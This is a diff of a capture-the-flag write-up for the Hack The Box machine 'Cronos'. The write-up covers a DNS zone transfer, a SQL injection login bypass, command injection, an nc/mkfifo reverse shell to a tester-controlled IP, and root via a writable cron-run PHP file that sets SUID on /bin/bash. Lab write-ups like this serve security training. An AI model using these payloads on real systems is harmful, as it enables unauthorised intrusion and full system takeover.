@@ -11,44 +11,42 @@
 
 ## Method
 
-
-
 ## Enumeration
 
 
 #### Nmap
 <p align="center">
+<img src="https://user-images.githubusercontent.com/21021400/145677718-6b630f54-92d5-4b90-81fb-10b4ee89e47c.png">
 </p>
-*1
 
 Open Ports:  
 22 - SSH  
-53 - HTTP  
+53 - DNS  
 80 - HTTP  
 
 #### Gobuster
 
 Gobuster - Port 80  
 <p align="center">
-*2
+<img src="https://user-images.githubusercontent.com/21021400/145677719-8e4f9dfc-7820-45e4-94e6-8c32a582ec1c.png">
 </p>
 
 the website
-*3
+<img src="https://user-images.githubusercontent.com/21021400/145677720-3e99be85-6762-4023-b68f-4ea99ef70811.png">
 <p align="center">
 </p>
 
 nslookup 10.10.10.13 10.10.10.13
 looking for virtual hosts and using the machine as the server
-*4
 <p align="center">
+<img src="https://user-images.githubusercontent.com/21021400/145677721-c549c411-d118-4ee8-b20f-8e09f00ece02.png">
 </p>
 
 found domain: cronos.htb
 
 looking for virtual hosts related to cronos.htb
-*5
 <p align="center">
+<img src="https://user-images.githubusercontent.com/21021400/145677722-ed52b9d2-3f44-4209-914e-f554938b985e.png">
 </p>
 dig axfr cronos.htb @10.10.10.13
 
@@ -57,125 +55,125 @@ ns1.cronos.htb
 admin.cronos.htb
 
 add to /etc/hosts
-*6
 <p align="center">
+<img src="https://user-images.githubusercontent.com/21021400/145677724-0e8d0677-de27-431c-b431-a4c2543bc3ef.png">
 </p>
 
 cronos.htb
-*7
 <p align="center">
+<img src="https://user-images.githubusercontent.com/21021400/145677725-62437be2-326c-4156-a4f1-056cf65a3d0f.png">
 </p>
 
 ns1.cronos.htb
-*8
 <p align="center">
+<img src="https://user-images.githubusercontent.com/21021400/145677726-669d2693-4015-4bd3-9fd1-e5db1f99600d.png">
 </p>
 
 admin.cronos.htb
-*9
 <p align="center">
+<img src="https://user-images.githubusercontent.com/21021400/145677727-1dd27a73-4488-4ab9-84df-3e66d18d86fa.png">
 </p>
 
 tried admin:admin and few more default credentials
-*10
 <p align="center">
+<img src="https://user-images.githubusercontent.com/21021400/145677728-c38155e2-6f05-4b32-a689-73826a4275f3.png">
 </p>
 
 tried sqli
 ' or 1==1-- -
-*11
 <p align="center">
+<img src="https://user-images.githubusercontent.com/21021400/145677729-957cac37-65da-4faf-b628-2a22bfa7f000.png">
 </p>
 
 and we're in.
-*12
 <p align="center">
+<img src="https://user-images.githubusercontent.com/21021400/145677730-8ba44d89-b9d2-40e3-bc3b-af0c3d40a76e.png">
 </p>
 
 pinged myself and captured the traffic with tcpdump
-*13
 <p align="center">
+<img src="https://user-images.githubusercontent.com/21021400/145677731-a0421405-d315-4c4d-83bb-358db05712b7.png">
 </p>
 
 tried command injection
 ;whoami
-*14
 <p align="center">
+<img src="https://user-images.githubusercontent.com/21021400/145677732-e56b199b-bef1-426b-8862-a9fbebf28565.png">
 </p>
 
 the user running the commands is www-data.
 
 lets get a reverse shell
 ;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 1234 >/tmp/f
-*15
 <p align="center">
+<img src="https://user-images.githubusercontent.com/21021400/145677733-3136df78-09b4-41a1-838e-d81c4ed01a9f.png">
 </p>
 
 users on the machine:
 www-data
 noulis
 root
-*15-2
 <p align="center">
+<img src="https://user-images.githubusercontent.com/21021400/145677734-876ef1e6-3b9a-4935-96b1-33269212394d.png">
 </p>
 
 
 www-data's groups
-*15-3
 <p align="center">
+<img src="https://user-images.githubusercontent.com/21021400/145677735-524fc622-ce17-478c-bc2c-a058ed843151.png">
 </p>
 
 suid
 find / -perm -4000 2>/dev/null
-*16
 <p align="center">
+<img src="https://user-images.githubusercontent.com/21021400/145677736-dd9b77d6-dd8e-433b-b7cf-5b1bf67f275c.png">
 </p>
 
 sudo
 sudo -l
-*17
 <p align="center">
+<img src="https://user-images.githubusercontent.com/21021400/145677737-7c8f3876-147c-4fd3-810b-43f038b7a8d6.png">
 </p>
 
 capabilities
 getcap -r / 2>/dev/null
-*18
 <p align="center">
+<img src="https://user-images.githubusercontent.com/21021400/145677739-1f478587-07f6-4cef-85a2-c402e4577402.png">
 </p>
 
 checking noulis' home directory
-*18-2
 <p align="center">
+<img src="https://user-images.githubusercontent.com/21021400/145677740-55b963a1-2c6f-47e9-8f5d-e721e09f6b2f.png">
 </p>
 
 checking /var/www directory
-*18-3
 <p align="center">
+<img src="https://user-images.githubusercontent.com/21021400/145677742-542d0ded-42b9-4f1a-bdef-4ee2150eebce.png">
 </p>
 
 laravel is installed in /var/www, checking config files in laravel
 /var/www/laravel/.env
-*19
 <p align="center">
+<img src="https://user-images.githubusercontent.com/21021400/145677743-be5d86da-253d-47fb-8d83-36e4dd8a01e7.png">
 </p>
 
 checking crontab
 cat /etc/crontab
-*20
 <p align="center">
+<img src="https://user-images.githubusercontent.com/21021400/145677744-5453e29a-9bfa-41d2-a291-59c471a12b35.png">
 </p>
 
 there is a cron job running by root every minute
 executing with php the /var/www/laravel/artisan file.
 
 checking the content of the file
-*21
 <p align="center">
+<img src="https://user-images.githubusercontent.com/21021400/145677745-a124ded3-b202-4f6b-9522-d1c1bd6384a0.png">
 </p>
 
 we can write to that file
-*22
 <p align="center">
+<img src="https://user-images.githubusercontent.com/21021400/145677746-4671096c-0975-4a67-83cf-ea1b57a76929.png">
 </p>
 
 lets replace the content of the file with the following:
@@ -184,21 +182,24 @@ system('chmod +s /bin/bash');
 ?>
 
 echo "<?php system('chmod +s /bin/bash'); ?>" > artisan
-*23
 <p align="center">
+<img src="https://user-images.githubusercontent.com/21021400/145677747-c67e0899-65b3-4edc-9aa5-1b3c133f36a9.png">
 </p>
 
 once executed by root, a SUID will be added to /bin/bash and we will be able to get a root shell.
 
 after a minute, checking the /bin/bash permissions:
-*24
 <p align="center">
+<img src="https://user-images.githubusercontent.com/21021400/145677751-26efb128-2f8d-4e92-a4fc-9ff0bc959494.png">
 </p>
 
 executing a root shell with
 bash -p
-*25
 <p align="center">
+<img src="https://user-images.githubusercontent.com/21021400/145677752-17ae7c2b-99f1-43e9-93ec-6ca7e13fbad5.png">
 </p>
 
 and we're root.
+
+
+
